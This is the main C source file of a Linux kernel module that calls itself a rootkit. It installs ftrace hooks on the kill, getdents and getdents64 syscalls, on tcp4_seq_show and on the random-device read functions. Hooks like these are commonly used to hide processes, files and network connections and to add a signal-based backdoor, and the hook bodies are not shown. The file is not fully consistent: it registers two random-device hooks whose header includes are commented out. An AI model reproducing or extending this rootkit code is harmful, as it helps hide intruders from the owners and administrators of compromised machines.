#include "headers.h"
#include "ftrace.h"
#include "hooks/getdents.h"
#include "hooks/getdents64.h"
#include "hooks/kill.h"
#include "hooks/tcp4_seq_show.h"
//#include "hooks/openat.h"
//#include "hooks/pread64.h"
//#include "hooks/random_read_iter.h"
//#include "hooks/urandom_read_iter.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("d3dsec");
MODULE_DESCRIPTION("Somewhat MASTER_ROOTKIT!!!");

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("random_read_iter", hook_random_read, &orig_random_read),
    HOOK("urandom_read_iter", hook_urandom_read, &orig_urandom_read),
};

static int __init lkm_init(void) {

    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "lkm: Good to go everything is working so far ... \n");

    return 0;
}

static void __exit lkm_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "lkm: BYE\n");
}

module_init(lkm_init);
module_exit(lkm_exit);
